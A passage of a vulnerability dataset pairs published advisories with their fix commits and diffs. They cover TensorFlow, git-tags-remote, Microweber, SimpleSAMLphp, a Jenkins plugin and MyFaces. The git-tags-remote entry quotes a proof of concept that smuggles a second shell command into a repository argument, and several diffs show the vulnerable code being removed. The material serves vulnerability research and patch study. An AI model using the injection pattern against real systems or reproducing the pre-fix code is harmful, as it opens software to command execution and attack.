'https:\/\/github.com\/ptrofimov\/beanstalk_console\/raw\/e351c8260ec1d3718d9e475ee57c7e12c47f19da\/lib%2Finclude.php', 'patch': \"@@ -19,7 +19,7 @@ function autoload_class($class) {\\n require_once dirname(__FILE__) . '\/..\/config.php';\\r\\n require_once dirname(__FILE__) . '\/..\/src\/Storage.php';\\r\\n \\r\\n-$GLOBALS['server'] = !empty($_GET['server']) ? $_GET['server'] : '';\\r\\n+$GLOBALS['server'] = !empty($_GET['server']) ? htmlspecialchars($_GET['server']) : '';\\r\\n $GLOBALS['action'] = !empty($_GET['action']) ? $_GET['action'] : '';\\r\\n $GLOBALS['state'] = !empty($_GET['state']) ? $_GET['state'] : '';\\r\\n $GLOBALS['count'] = !empty($_GET['count']) ? $_GET['count'] : '';\"}}","message_norm":"sanitize input","language":"ro","entities":"[('sanitize', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/include.php'])","num_files":1.0},{"index":1894,"vuln_id":"GHSA-gjqc-q9g6-q2j3","cwe_id":"{'CWE-617'}","score":6.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a7c02f1a9bbc35473969618a09ee5f9f5d3e52d9'}","dataset":"osv","summary":"`CHECK`-failures in binary ops in Tensorflow ### Impact\nA malicious user can cause a denial of service by altering a `SavedModel` such that [any binary op](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/kernels\/cwise_ops_common.h#L88-L137) would trigger `CHECK` failures. This occurs when the protobuf part corresponding to the tensor arguments is modified such that the `dtype` no longer matches the `dtype` expected by the op. In that case, calling the templated binary operator for the binary op would receive corrupted data, due to the type confusion involved:\n\n```cc\nfunctor::BinaryFunctor<Device, Functor, 1>()(\n    eigen_device, out->template flat<Tout>(),\n    input_0.template flat<Tin>(), input_1.template flat<Tin>(),\n    error_ptr);\n```\nIf `Tin` and `Tout` don't match the type of data in `out` and `input_*` tensors then `flat<*>` would interpret it wrongly. In most cases, this would be a silent failure, but we have noticed scenarios where this results in a `CHECK` crash, hence a denial of service.\n\n### Patches\nWe have patched the issue in GitHub commit [a7c02f1a9bbc35473969618a09ee5f9f5d3e52d9](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a7c02f1a9bbc35473969618a09ee5f9f5d3e52d9).\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2022-02-10","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a7c02f1a9bbc35473969618a09ee5f9f5d3e52d9","commit_sha":"a7c02f1a9bbc35473969618a09ee5f9f5d3e52d9","patch":"SINGLE","chain_ord":"['a7c02f1a9bbc35473969618a09ee5f9f5d3e52d9']","before_first_fix_commit":"{'c7db81b86b6746b494e5359433aa8e2dd7df25f6'}","last_fix_commit":"a7c02f1a9bbc35473969618a09ee5f9f5d3e52d9","chain_ord_pos":1.0,"commit_datetime":"11\/12\/2021, 08:24:39","message":"Validate real and expected type of arguments to cwise ops.\n\nWithout this validation, it is possible to trigger a `CHECK`-fail denial of service.\n\nThis is a rollforward of a previous commit which was rolled back as it was relying on RTTI. This time we don't use RTTI, we replace `typeid(Tin).name()` with a double function call, `DataTypeString(DataTypeToEnum<Tin>::v())`.\n\nPiperOrigin-RevId: 409340416\nChange-Id: I96080b2796729a3a9b65e7c68307ac276070f2f0","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 10, 'deletions': 0, 'total': 10}","files":"{'tensorflow\/core\/kernels\/cwise_ops_common.h': {'additions': 10, 'deletions': 0, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/a7c02f1a9bbc35473969618a09ee5f9f5d3e52d9\/tensorflow%2Fcore%2Fkernels%2Fcwise_ops_common.h', 'patch': '@@ -87,7 +87,17 @@ class BinaryOp : public BinaryOpShared {\\n \\n   void Compute(OpKernelContext* ctx) override {\\n     const Tensor& input_0 = ctx->input(0);\\n+    OP_REQUIRES(ctx, input_0.dtype() == DataTypeToEnum<Tin>::v(),\\n+                errors::InvalidArgument(\\n+                    \"Expected tensor of type \",\\n+                    DataTypeString(DataTypeToEnum<Tin>::v()), \" but got type \",\\n+                    DataTypeString(input_0.dtype())));\\n     const Tensor& input_1 = ctx->input(1);\\n+    OP_REQUIRES(ctx, input_1.dtype() == DataTypeToEnum<Tin>::v(),\\n+                errors::InvalidArgument(\\n+                    \"Expected tensor of type \",\\n+                    DataTypeString(DataTypeToEnum<Tin>::v()), \" but got type \",\\n+                    DataTypeString(input_1.dtype())));\\n     const Device& eigen_device = ctx->eigen_device<Device>();\\n     bool error = false;\\n     bool* const error_ptr = Functor::has_errors ? &error : nullptr;'}}","message_norm":"validate real and expected type of arguments to cwise ops.\n\nwithout this validation, it is possible to trigger a `check`-fail denial of service.\n\nthis is a rollforward of a previous commit which was rolled back as it was relying on rtti. this time we don't use rtti, we replace `typeid(tin).name()` with a double function call, `datatypestring(datatypetoenum<tin>::v())`.\n\npiperorigin-revid: 409340416\nchange-id: i96080b2796729a3a9b65e7c68307ac276070f2f0","language":"en","entities":"[('validate', 'ACTION', ''), ('denial of service', 'SECWORD', ''), ('409340416', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/cwise_ops_common.h'])","num_files":1.0},{"index":1897,"vuln_id":"GHSA-gm9x-q798-hmr4","cwe_id":"{'CWE-78'}","score":7.2,"chain":"{'https:\/\/github.com\/sh0ji\/git-tags-remote\/commit\/a20488960cbd2c98455386108253094897ebfc1c'}","dataset":"osv","summary":"Command Injection in git-tags-remote All versions of `git-tags-remote ` are vulnerable to Command Injection. The package fails to sanitize the repository input and passes it directly to an `exec` call on the `get` function . This may allow attackers to execute arbitrary code in the system if the `repo` value passed to the function is user-controlled.  \n\nThe following proof-of-concept creates a file in `\/tmp`:  \n```\nconst gitTagsRemote = require('git-tags-remote');\n\ngitTagsRemote.get('https:\/\/github.com\/sh0ji\/git-tags-remote.git; echo \"Injection Success\" > \/tmp\/command-injection.test')\n.then(tags => console.log(tags));\n```","published_date":"2020-07-29","chain_len":1,"project":"https:\/\/github.com\/sh0ji\/git-tags-remote","commit_href":"https:\/\/github.com\/sh0ji\/git-tags-remote\/commit\/a20488960cbd2c98455386108253094897ebfc1c","commit_sha":"a20488960cbd2c98455386108253094897ebfc1c","patch":"SINGLE","chain_ord":"['a20488960cbd2c98455386108253094897ebfc1c']","before_first_fix_commit":"{'c43558b77312a13f69ca25ed965cf4792c239458'}","last_fix_commit":"a20488960cbd2c98455386108253094897ebfc1c","chain_ord_pos":1.0,"commit_datetime":"06\/21\/2021, 20:02:24","message":"fix: use spawn for more secure input\n\nresolves #58","author":"Evan Yamanishi","comments":null,"stats":"{'additions': 23, 'deletions': 10, 'total': 33}","files":"{'src\/index.ts': {'additions': 23, 'deletions': 10, 'changes': 33, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/sh0ji\/git-tags-remote\/raw\/a20488960cbd2c98455386108253094897ebfc1c\/src%2Findex.ts', 'patch': \"@@ -1,17 +1,30 @@\\n import { valid, compare } from 'semver';\\n-import { exec } from 'child_process';\\n+import { spawn } from 'child_process';\\n \\n-const lsRemoteTags = (repo: string): Promise<string> => new Promise(\\n-\\t(resolve, reject) => {\\n-\\t\\texec(`git ls-remote --tags ${repo}`, (_, stdout, stderr) => {\\n-\\t\\t\\tif (stderr) reject(new Error(stderr));\\n-\\t\\t\\tresolve(stdout.toString().trim());\\n-\\t\\t});\\n-\\t},\\n-);\\n+const lsRemoteTags = (repoPath: string): Promise<string> => new Promise((resolve, reject) => {\\n+\\tlet stderr = '';\\n+\\tlet stdout = '';\\n+\\n+\\tconst child = spawn('git', ['ls-remote', '--tags', repoPath]);\\n+\\n+\\tchild.stdout.on('data', (data) => {\\n+\\t\\tstdout += data;\\n+\\t});\\n+\\n+\\tchild.stderr.on('data', (data) => {\\n+\\t\\tstderr += data;\\n+\\t});\\n+\\n+\\tchild.on('error', reject);\\n+\\n+\\tchild.on('close', (exitCode) => {\\n+\\t\\tif (exitCode !== 0 || stderr.length) reject(new Error(stderr));\\n+\\t\\tresolve(stdout.toString().trim());\\n+\\t});\\n+});\\n \\n const parseTags = (tags: string): Map<string, string> => {\\n-\\tconst tagMap = new Map();\\n+\\tconst tagMap = new Map<string, string>();\\n \\ttags.split('\\\\n')\\n \\t\\t.forEach((str) => {\\n \\t\\t\\tconst ref = str.split(\/\\\\t\/);\"}}","message_norm":"fix: use spawn for more secure input\n\nresolves #58","language":"en","entities":"[('secure', 'SECWORD', ''), ('#58', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/index.ts'])","num_files":1.0},{"index":1898,"vuln_id":"GHSA-gmh3-x5w7-jg5m","cwe_id":"{'CWE-79'}","score":6.3,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/79c6914bab8c9da07ac950fda17648d08c68b130'}","dataset":"osv","summary":"Microweber before v1.2.20 vulnerable to cross-site scripting Prior to Microweber v1.2.20, due to improper neutralization of input, an attacker can steal tokens to perform cross-site request forgery (CSRF), fetch contents from same-site and redirect a user.","published_date":"2022-07-10","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/79c6914bab8c9da07ac950fda17648d08c68b130","commit_sha":"79c6914bab8c9da07ac950fda17648d08c68b130","patch":"SINGLE","chain_ord":"['79c6914bab8c9da07ac950fda17648d08c68b130']","before_first_fix_commit":"{'d35e691e72d358430abc8e99f5ba9eb374423b9f'}","last_fix_commit":"79c6914bab8c9da07ac950fda17648d08c68b130","chain_ord_pos":1.0,"commit_datetime":"07\/08\/2022, 17:31:13","message":"update","author":"Peter Ivanov","comments":null,"stats":"{'additions': 14, 'deletions': 2, 'total': 16}","files":"{'userfiles\/modules\/microweber\/toolbar\/editor_tools\/module_settings\/index.php': {'additions': 14, 'deletions': 2, 'changes': 16, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/79c6914bab8c9da07ac950fda17648d08c68b130\/userfiles%2Fmodules%2Fmicroweber%2Ftoolbar%2Feditor_tools%2Fmodule_settings%2Findex.php', 'patch': '@@ -87,14 +87,24 @@\\n     if (isset($_GET[\\'autosize\\'])) {\\n         $autoSize = $_GET[\\'autosize\\'];\\n     }\\n-    $autoSize = xss_clean($autoSize);\\n+    $autoSize = intval($autoSize);\\n \\n     $type = \\'\\';\\n     if (isset($_GET[\\'type\\'])) {\\n         $type = $_GET[\\'type\\'];\\n     }\\n     $type = xss_clean($type);\\n \\n+            $other = [\\n+                \\';\\',\\n+                \\'\\\\\\'\\',\\n+                \\'\/\/\\',\\n+                \\'`\\',\\n+                \\'\\\\\\\\\\',\\n+\\n+            ];\\n+    $type = str_replace($other, \\'\\', $type);\\n+\\n     $mod_id = $mod_orig_id = false;\\n     $is_linked_mod = false;\\n \\n@@ -108,6 +118,8 @@\\n     if ($mod_id != $mod_orig_id) {\\n         $is_linked_mod = true;\\n     }\\n+\\n+\\n     ?>\\n \\n     <script type=\"text\/javascript\">\\n@@ -124,7 +136,7 @@\\n         addIcon();\\n \\n         autoSize = <?php  print $autoSize; ?>;\\n-        settingsType = \\'<?php print $type; ?>\\';\\n+        settingsType = \\'<?php print htmlentities($type); ?>\\';\\n \\n         window.onbeforeunload = function () {\\n             $(document.body).addClass(\"mw-external-loading\")'}}","message_norm":"update","language":"ro","entities":"[('update', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['userfiles\/modules\/microweber\/toolbar\/editor_tools\/module_settings\/index.php'])","num_files":1.0},{"index":1904,"vuln_id":"GHSA-gp2m-7cfp-h6gf","cwe_id":"{'CWE-384'}","score":9.8,"chain":"{'https:\/\/github.com\/simplesamlphp\/simplesamlphp\/commit\/90dca835158495b173808273e7df127303b8b953'}","dataset":"osv","summary":"Incorrect persistent NameID generation in SimpleSAMLphp ### Background\nWhen a SimpleSAMLphp Identity Provider is misconfigured, a bug in the software when trying to build a persistent `NameID` to univocally identify the authenticating subject could cause different users to get the same identifier generated, depending on the attributes available for them right after authentication.\n\nPlease note that even though this is possible thanks to a bug, **an IdP must be misconfigured** to release persistent `NameID`s even if it is not properly configured to generate them based on the specifics of the deployment.\n\n### Description\nPersistent `NameID`s will typically be sent as part of the `Subject` element of a SAML assertion, or as the contents of the `eduPersonTargetedID` attribute. Here is an example of such a `NameID`:\n\n    <NameID Format=\u201curn:oasis:names:tc:SAML:2.0:nameid-format:persistent\u201c>\n        zbonsm0Yn9Gnw14uQEEPr6AO7d+IvxwCQN3t+o24jYs=\n    <\/NameID>\n\nSome service providers will use this information to identify a user across sessions because a persistent `NameID` will never change for a given user. This could lead to different users accessing the same account in those service providers.\n\nIn order to be affected by this issue, the following circumstances must concur:\n\n- SimpleSAMLphp acts as an identity provider.\n- The service provider asking for authentication requests a persistent `NameID`.\n- No `saml:PersistentNameID` authentication processing filter is configured (neither for the whole IdP, nor for a given SP).\n- No `simplesaml.nameidattribute` configuration option is set (neither for the whole IdP, nor for a given SP).\n- One of the following alternatives:\n  - No `userid.attribute` configuration option is set **and** the users don't have an `eduPersonPrincipalName` attribute in the users backend, **or**\n  - the `userid.attribute` configuration option is set to an empty or missing attribute.\n\nIf all these requirements are met, the `SimpleSAML_Auth_ProcessingChain` class will try to keep a unique user identifier in the state array (`addUserID()` method). Bear in mind that this code is executed **before** all the authentication processing filters configured, meaning that only those attributes retrieved for the user during **initial authentication** will be available. If no `userid.attribute` configuration option is set, the default `eduPersonPrincipalName` will then be used. However, since it is missing, no identifier will be kept. Alternatively, if `userid.attribute` is set to a missing or empty attribute, the `addUserID()` method will abort trying to register an identifier.\n\nAfter executing all authentication processing filters, SimpleSAMLphp will build a SAML assertion. If the service provider requests persistent `NameID`s, SimpleSAMLphp will attempt to generate one given that none is already available (because the `saml:PersistentNameID` filter was not used). At this point, the code will look for the `simplesaml.nameidattribute` configuration option in either the local IdP metadata or in the remote SP metadata. If none of them are configured, it will default to the unique user identifier previously registered by `SimpleSAML_Auth_ProcessingChain`. If no identifier was kept there, the code will log an error message:\n\n    Unable to generate NameID. Check the userid.attribute option.\n\nHowever, instead of aborting the `NameID` generation at that point, it will go on and use a value missing from the state array as the source for the computation, meaning the `null` type will be used. Hence, all users connecting to a given service provider will get the same `NameID` generated, because all the input parameters will be the same:\n\n- The SP's entity identifier.\n- The IdP's entity identifier.\n- The `null` value.\n- The common secret salt from the main configuration.\n\n### Affected versions\nAll SimpleSAMLphp versions between 1.7.0 and 1.14.10, inclusive.\n\n### Impact\nThose identity providers affected by this bug and misconfigured as previously described could be issuing SAML assertions with common `NameID`s for all or a subset of their users. If a service provider uses those `NameID`s to identify the users of the affected IdP, all the users will be associated with the same user account at the service provider, causing all sorts of potential security issues like information disclosure or unauthorized access.\n\nWhile we can consider this unlikely to happen, some cases have been already observed. In particular, some identity providers using default configurations and consuming metadata automatically (i.e. using the _metarefresh_ module) while using a user backend like _Active Directory_ that does not populate `eduPersonPrincipalName` are particularly sensitive to this issue.\n\n### Resolution\nUpgrade to the latest version.\n\nConfigure a `saml:PersistentNameID` authentication processing filter according to your needs. Remember to check that **the attribute used as the source** for the `NameID` **is present at the moment the `saml:PersistentNameID` filter is executed**. The attribute used must be **unique** per user, and **must not change** over time.","published_date":"2020-01-24","chain_len":1,"project":"https:\/\/github.com\/simplesamlphp\/simplesamlphp","commit_href":"https:\/\/github.com\/simplesamlphp\/simplesamlphp\/commit\/90dca835158495b173808273e7df127303b8b953","commit_sha":"90dca835158495b173808273e7df127303b8b953","patch":"SINGLE","chain_ord":"['90dca835158495b173808273e7df127303b8b953']","before_first_fix_commit":"{'300d8aa48fe93706ade95be481c68e9cf2f32d1f'}","last_fix_commit":"90dca835158495b173808273e7df127303b8b953","chain_ord_pos":1.0,"commit_datetime":"12\/12\/2016, 11:21:31","message":"bugfix: Make sure a persistent NameID is not generated by default when the UserID is missing in the state array.\n\nThis allowed misconfigured IdPs (i.e. those without both a PersistenNameID authproc filter, a \u201cuserid.attribute\u201d configuration option and no \u201ceduPersonPrincipalName\u201d attribute available after running all the authentication processing filters) to generate a persistent NameID based on \u201cnull\u201d, effectively giving all users the same identifier.","author":"Jaime Pe\u0301rez","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'modules\/saml\/lib\/IdP\/SAML2.php': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/simplesamlphp\/simplesamlphp\/raw\/90dca835158495b173808273e7df127303b8b953\/modules%2Fsaml%2Flib%2FIdP%2FSAML2.php', 'patch': \"@@ -623,6 +623,7 @@ private static function generateNameIdValue(SimpleSAML_Configuration $idpMetadat\\n \\t\\t\\tif ($attribute === NULL) {\\n \\t\\t\\t\\tif (!isset($state['UserID'])) {\\n \\t\\t\\t\\t\\tSimpleSAML_Logger::error('Unable to generate NameID. Check the userid.attribute option.');\\n+\\t\\t\\t\\t\\treturn NULL;\\n \\t\\t\\t\\t}\\n \\t\\t\\t\\t$attributeValue = $state['UserID'];\\n \\t\\t\\t\\t$idpEntityId = $idpMetadata->getString('entityid');\"}}","message_norm":"bugfix: make sure a persistent nameid is not generated by default when the userid is missing in the state array.\n\nthis allowed misconfigured idps (i.e. those without both a persistennameid authproc filter, a \u201cuserid.attribute\u201d configuration option and no \u201cedupersonprincipalname\u201d attribute available after running all the authentication processing filters) to generate a persistent nameid based on \u201cnull\u201d, effectively giving all users the same identifier.","language":"en","entities":"[('bugfix', 'FLAW', ''), ('authentication', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['modules\/saml\/lib\/IdP\/SAML2.php'])","num_files":1.0},{"index":1907,"vuln_id":"GHSA-gp67-c7j2-2qg2","cwe_id":"{'CWE-532', 'CWE-319'}","score":6.5,"chain":"{'https:\/\/github.com\/jenkinsci\/mask-passwords-plugin\/commit\/aadefdbf319954cf0c5acbe032637e1c0a924f37'}","dataset":"osv","summary":"Insertion of Sensitive Information into Log File in Jenkins Mask Passwords Plugin Jenkins Mask Passwords Plugin 2.12.0 and earlier transmits globally configured passwords in plain text as part of the configuration form, potentially resulting in their exposure.","published_date":"2022-05-24","chain_len":1,"project":"https:\/\/github.com\/jenkinsci\/mask-passwords-plugin","commit_href":"https:\/\/github.com\/jenkinsci\/mask-passwords-plugin\/commit\/aadefdbf319954cf0c5acbe032637e1c0a924f37","commit_sha":"aadefdbf319954cf0c5acbe032637e1c0a924f37","patch":"SINGLE","chain_ord":"['aadefdbf319954cf0c5acbe032637e1c0a924f37']","before_first_fix_commit":"{'3440b0aa5d2553889245327a9d37a006b4b17c3f'}","last_fix_commit":"aadefdbf319954cf0c5acbe032637e1c0a924f37","chain_ord_pos":1.0,"commit_datetime":"01\/28\/2020, 02:43:19","message":"[SECURITY-157] Fix global mask passwords config\n\nSince the security issue has been public for several months, there's no\nneed to hide proposing the fix.\n\nThis fixes the global configuration page by displaying the encrypted\nvalues of global password variables instead of plaintext within the\npassword form.\n\nSee also:\n\n- [SECURITY-157][SECURITY-157]\n- [security advisory published 2019-08-07][advisory]\n\n[advisory]: https:\/\/jenkins.io\/security\/advisory\/2019-08-07\/#SECURITY-157\n[SECURITY-157]: https:\/\/issues.jenkins-ci.org\/browse\/SECURITY-157","author":"Sam Gleske","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/main\/resources\/com\/michelin\/cio\/hudson\/plugins\/maskpasswords\/MaskPasswordsBuildWrapper\/global.jelly': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jenkinsci\/mask-passwords-plugin\/raw\/aadefdbf319954cf0c5acbe032637e1c0a924f37\/src%2Fmain%2Fresources%2Fcom%2Fmichelin%2Fcio%2Fhudson%2Fplugins%2Fmaskpasswords%2FMaskPasswordsBuildWrapper%2Fglobal.jelly', 'patch': '@@ -51,7 +51,7 @@\\n                         <\/td>\\n                         <td width=\"10%\" align=\"right\">${%Password}<\/td>\\n                         <td width=\"30%\">\\n-                            <f:password name=\"globalVarPasswordPair.password\" value=\"${!empty globalVarPasswordPair.password?globalVarPasswordPair.password:\\'\\'}\"\/>\\n+                            <f:password name=\"globalVarPasswordPair.password\" value=\"${!empty globalVarPasswordPair.passwordAsSecret?globalVarPasswordPair.passwordAsSecret.encryptedValue:\\'\\'}\"\/>\\n                         <\/td>\\n                         <td width=\"20%\" align=\"right\"><f:repeatableDeleteButton\/><\/td>\\n                     <\/tr>'}}","message_norm":"[security-157] fix global mask passwords config\n\nsince the security issue has been public for several months, there's no\nneed to hide proposing the fix.\n\nthis fixes the global configuration page by displaying the encrypted\nvalues of global password variables instead of plaintext within the\npassword form.\n\nsee also:\n\n- [security-157][security-157]\n- [security advisory published 2019-08-07][advisory]\n\n[advisory]: https:\/\/jenkins.io\/security\/advisory\/2019-08-07\/#security-157\n[security-157]: https:\/\/issues.jenkins-ci.org\/browse\/security-157","language":"en","entities":"[('security-157', 'SECWORD', ''), ('fix', 'ACTION', ''), ('passwords', 'SECWORD', ''), ('security', 'SECWORD', ''), ('issue', 'FLAW', ''), ('fixes', 'ACTION', ''), ('password', 'SECWORD', ''), ('password', 'SECWORD', ''), ('security-157][security-157', 'SECWORD', ''), ('security', 'SECWORD', ''), ('https:\/\/jenkins.io\/security\/advisory\/2019-08-07\/#security-157', 'SECWORD', ''), ('security-157', 'SECWORD', ''), ('https:\/\/issues.jenkins-ci.org\/browse\/security-157', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/main\/resources\/com\/michelin\/cio\/hudson\/plugins\/maskpasswords\/MaskPasswordsBuildWrapper\/global.jelly'])","num_files":1.0},{"index":1915,"vuln_id":"GHSA-gq4h-f254-7cw9","cwe_id":"{'CWE-362'}","score":8.1,"chain":"{'https:\/\/github.com\/kvark\/ticketed_lock\/pull\/8\/commits\/a986a9335d591fa5c826157d1674d47aa525357f'}","dataset":"osv","summary":"Data races in ticketed_lock Affected versions of this crate unconditionally implemented `Send` for `ReadTicket<T>` & `WriteTicket<T>`.\nThis allows to send non-Send `T` to other threads.\n\nThis can allows creating data races by cloning types with internal mutability and sending them to other threads (as `T` of `ReadTicket<T>`\/`WriteTicket<T>`). Such data races can cause memory corruption or other undefined behavior.\n\nThe flaw was corrected in commit a986a93 by adding `T: Send` bounds to `Send` impls of `ReadTicket<T>`\/`WriteTicket<T>`.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/kvark\/ticketed_lock","commit_href":"https:\/\/github.com\/kvark\/ticketed_lock\/pull\/8\/commits\/a986a9335d591fa5c826157d1674d47aa525357f","commit_sha":"a986a9335d591fa5c826157d1674d47aa525357f","patch":"SINGLE","chain_ord":"['a986a9335d591fa5c826157d1674d47aa525357f']","before_first_fix_commit":"{'6d85af9eb5d8bb7cf142de8e832ce3af7e47e306'}","last_fix_commit":"a986a9335d591fa5c826157d1674d47aa525357f","chain_ord_pos":1.0,"commit_datetime":"01\/24\/2021, 04:07:17","message":"'T: Send' to prevent misuse","author":"JOE1994","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'src\/lib.rs': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/kvark\/ticketed_lock\/raw\/a986a9335d591fa5c826157d1674d47aa525357f\/src%2Flib.rs', 'patch': '@@ -50,7 +50,7 @@ pub struct ReadTicket<T> {\\n     data: Arc<UnsafeCell<T>>,\\n }\\n \\n-unsafe impl<T> Send for ReadTicket<T> {}\\n+unsafe impl<T: Send> Send for ReadTicket<T> {}\\n \\n #[cfg(not(feature = \"futures\"))]\\n impl<T> ReadTicket<T> {\\n@@ -112,7 +112,7 @@ pub struct WriteTicket<T> {\\n     data: Arc<UnsafeCell<T>>,\\n }\\n \\n-unsafe impl<T> Send for WriteTicket<T> {}\\n+unsafe impl<T: Send> Send for WriteTicket<T> {}\\n \\n #[cfg(not(feature = \"futures\"))]\\n impl<T> WriteTicket<T> {'}}","message_norm":"'t: send' to prevent misuse","language":"en","entities":"[('prevent', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/lib.rs'])","num_files":1.0},{"index":1916,"vuln_id":"GHSA-gq67-pp9w-43gp","cwe_id":"{'CWE-330', 'CWE-352'}","score":0.0,"chain":"{'https:\/\/github.com\/apache\/myfaces\/commit\/cc6e1cc7b9aa17e52452f7f2657b3af9c421b2b2'}","dataset":"osv","summary":"Cryptographically weak CSRF tokens in Apache MyFaces In the default configuration, Apache MyFaces Core versions 2.2.0 to 2.2.13, 2.3.0 to 2.3.7, 2.3-next-M1 to 2.3-next-M4, and 3.0.0-RC1 use cryptographically weak implicit and explicit cross-site request forgery (CSRF) tokens. Due to that limitation, it is possible (although difficult) for an attacker to calculate a future CSRF token value and to use that value to trick a user into executing unwanted actions on an application.\n\n\nMitigation:\nExisting web.xml configuration parameters can be used to direct\nMyFaces to use SecureRandom for CSRF token generation:\n\norg.apache.myfaces.RANDOM_KEY_IN_VIEW_STATE_SESSION_TOKEN=secureRandom\norg.apache.myfaces.RANDOM_KEY_IN_CSRF_SESSION_TOKEN=secureRandom\norg.apache.myfaces.RANDOM_KEY_IN_WEBSOCKET_SESSION_TOKEN=secureRandom","published_date":"2021-06-16","chain_len":1,"project":"https:\/\/github.com\/apache\/myfaces","commit_href":"https:\/\/github.com\/apache\/myfaces\/commit\/cc6e1cc7b9aa17e52452f7f2657b3af9c421b2b2","commit_sha":"cc6e1cc7b9aa17e52452f7f2657b3af9c421b2b2","patch":"SINGLE","chain_ord":"['cc6e1cc7b9aa17e52452f7f2657b3af9c421b2b2']","before_first_fix_commit":"{'2683d7ec7008eb2a728423ad6e574fa83137b65c', '413d25bfc0ba3a49a06484e17d603a25ce4af436'}","last_fix_commit":"cc6e1cc7b9aa17e52452f7f2657b3af9c421b2b2","chain_ord_pos":1.0,"commit_datetime":"01\/13\/2021, 19:51:15","message":"Merge pull request #132 from wtlucy\/secureRandom_master\n\nMYFACES-4373: prefer SecureRandom for token generation","author":"Thomas Andraschko","comments":null,"stats":"{'additions': 7, 'deletions': 7, 'total': 14}","files":"{'impl\/src\/main\/java\/org\/apache\/myfaces\/config\/MyfacesConfig.java': {'additions': 7, 'deletions': 7, 'changes': 14, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/apache\/myfaces\/raw\/cc6e1cc7b9aa17e52452f7f2657b3af9c421b2b2\/impl%2Fsrc%2Fmain%2Fjava%2Forg%2Fapache%2Fmyfaces%2Fconfig%2FMyfacesConfig.java', 'patch': '@@ -459,12 +459,12 @@\\n      * Adds a random key to the generated view state session token.\\n      *\/\\n     @JSFWebConfigParam(since=\"2.1.9, 2.0.15\", expectedValues=\"secureRandom, random\", \\n-            defaultValue=\"random\", group=\"state\")\\n+            defaultValue=\"secureRandom\", group=\"state\")\\n     public static final String RANDOM_KEY_IN_VIEW_STATE_SESSION_TOKEN\\n             = \"org.apache.myfaces.RANDOM_KEY_IN_VIEW_STATE_SESSION_TOKEN\";\\n-    private static final String RANDOM_KEY_IN_VIEW_STATE_SESSION_TOKEN_DEFAULT = \"random\";\\n     public static final String RANDOM_KEY_IN_VIEW_STATE_SESSION_TOKEN_SECURE_RANDOM = \"secureRandom\";\\n     public static final String RANDOM_KEY_IN_VIEW_STATE_SESSION_TOKEN_RANDOM = \"random\";\\n+    private static final String RANDOM_KEY_IN_VIEW_STATE_SESSION_TOKEN_DEFAULT = RANDOM_KEY_IN_VIEW_STATE_SESSION_TOKEN_SECURE_RANDOM;\\n     \\n     \/**\\n      * Set the default length of the random key added to the view state session token.\\n@@ -499,16 +499,16 @@\\n             = \"org.apache.myfaces.RANDOM_KEY_IN_VIEW_STATE_SESSION_TOKEN_SECURE_RANDOM_ALGORITHM\";\\n     private static final String RANDOM_KEY_IN_VIEW_STATE_SESSION_TOKEN_SECURE_RANDOM_ALGORITHM_DEFAULT = \"SHA1PRNG\";\\n     \\n+    public static final String RANDOM_KEY_IN_CSRF_SESSION_TOKEN_SECURE_RANDOM = \"secureRandom\";\\n+    public static final String RANDOM_KEY_IN_CSRF_SESSION_TOKEN_RANDOM = \"random\";\\n+    \\n     \/**\\n      * Defines how to generate the csrf session token.\\n      *\/\\n-    @JSFWebConfigParam(since=\"2.2.0\", expectedValues=\"secureRandom, random\", defaultValue=\"none\", group=\"state\")\\n+    @JSFWebConfigParam(since=\"2.2.0\", expectedValues=\"secureRandom, random\", defaultValue=\"secureRandom\", group=\"state\")\\n     public static final String RANDOM_KEY_IN_CSRF_SESSION_TOKEN\\n             = \"org.apache.myfaces.RANDOM_KEY_IN_CSRF_SESSION_TOKEN\";\\n-    private static final String RANDOM_KEY_IN_CSRF_SESSION_TOKEN_DEFAULT = \"random\";\\n-    \\n-    public static final String RANDOM_KEY_IN_CSRF_SESSION_TOKEN_SECURE_RANDOM = \"secureRandom\";\\n-    public static final String RANDOM_KEY_IN_CSRF_SESSION_TOKEN_RANDOM = \"random\";\\n+    private static final String RANDOM_KEY_IN_CSRF_SESSION_TOKEN_DEFAULT = 